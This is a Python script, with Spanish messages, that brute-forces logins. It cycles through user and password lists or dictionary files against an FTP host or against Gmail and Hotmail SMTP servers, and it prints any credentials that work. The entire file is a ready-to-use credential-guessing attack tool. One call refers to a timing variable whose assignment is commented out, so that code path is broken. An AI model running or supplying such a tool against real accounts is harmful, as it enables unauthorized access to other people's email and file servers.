#!/usr/bin/python
#-*-coding: utf-8-*-
from sys import argv
from ftplib import FTP 
from time import sleep
from smtplib import SMTP

def bforcemail(users, passwords, server):
	server = SMTP(server)
	server.starttls()
	for user in users:
		for password in passwords:
			try:
				server.login(user, password)
			except Exception as e:
				print("{} probablemente no es la clave de {}\n\n{}".format(password, user, e))
			else:
				print("{} es la clave de {}".format(password, user))
				exit()
		sleep(3)
	server.quit()
def bforceftp(users, passwords, server, tm):
	conexion = FTP(server)
	for user in users:
		for password in passwords:
			try:
				conexion.login(user, password)
			except Exception as e:
				print("\n[*]{}".format(e))
				sleep(tm)
			else:
				print("Servidor: {}".format(server))
				print("Usuario: {}".format(user))				
				print("Clave: {}".format(password))
				exit()
	conexion.quit()

				

def listaup(lista, count):
	if len(lista) >= 1:
		lista.append(lista[0])
		lista[0] = argv[count + 1]
	else:
		lista.append(argv[count + 1])
	return lista

def listaupf(lista, count):
	try:
		file = open(argv[count + 1], "r")
	except:
		print("No se pudo encontrar el siguiente archivo:\n{}".format(argv[count + 1]))
		exit()
	else:
		for line in file:
			lista.append(line)
		file.close()
		return lista

def h():
	print("\nOpciones:")
	print("\nSe debe de especificar que servicio se va a atacar:\nftp o mail.")
	print("\nmail: --mail\nftp: --ftp\n\nLas banderas que se pueden usar en los 2 prametros:")
	print("\n-u:  Se usa para establecer con que usuario ingresar.\n-uf: Establecer diccionario de usuarios.")
	print("-p:  Sirve para establecer una contraseña.\n-pf: Establecer diccionario de contraseñas.")
	#print("-t:  Sirve para establecer el tiempo entre cada intento.")
	print("\nSolo hay una bandera exclusiva para ftp:\n\n-hst:  Sirve para establecer la dirección del servidor.")
	print("\nBanderas para --mail:")
	print("\n\nSi se usa --mail debe usarse -gm o -hm, para escoger gmail o hotmail.")

if __name__ == '__main__':
	if len(argv) == 1:
		print("{} -h para ver las opciones.".format(argv[0]))
	elif len(argv) == 2 and argv[1] == "-h":
		h()
	else:
		userslist = []
		passwordlist = []
		ip = str()
		argcount = 1
		#time = 5
		ftp, mail = False, False
		gm, hm = False, False
		for arg in argv[1:]:
			if arg[0] != "-":
				argcount += 1
				continue
			if arg == "--ftp":
				ftp = True
				argcount += 1
				continue
			elif arg == "--mail":
				mail = True
				srv = str()
				argcount += 1
				continue
			if ftp == True and mail == True:
				print("No se puede usar las banderas --ftp y --mail al mismo tiempo")
				exit()
			if arg == "-uf":
				listaupf(userslist, argcount)
			elif arg == "-u":
				listaup(userslist, argcount)
			elif arg == "-hst":
				ip = argv[argcount + 1]
			elif arg == "-pf":
				listaupf(passwordlist, argcount)
			elif arg == "-p":
				listaup(passwordlist, argcount)
			elif arg == "-gm":
				gm = True
			elif arg == "-hm":
				hm = True
			else:
				print("No se reconoce '{}' como una bandera.".format(arg))
				exit()
			argcount += 1
			if gm == True and hm == True:
				print("No se puede usar -gm y -hm al mismo tiempo.")
				exit()
		if gm == True:
		    srv = 'smtp.gmail.com:587'
		elif hm == True:
			srv = 'smtp.live.com:587'
		if ftp == True and ip == "":
			print("para usar --ftp se ocupa determinar una ip:\n-hst (ip del servidor ftp)")
			exit()
		elif ftp == True:
			bforceftp(userslist, passwordlist, ip, time)
		elif mail == True and srv != "":
			bforcemail(userslist, passwordlist, srv)
		elif mail == True and srv == "":
			print("No se ha determinado si se usará gmail o hotmail.")
			exit()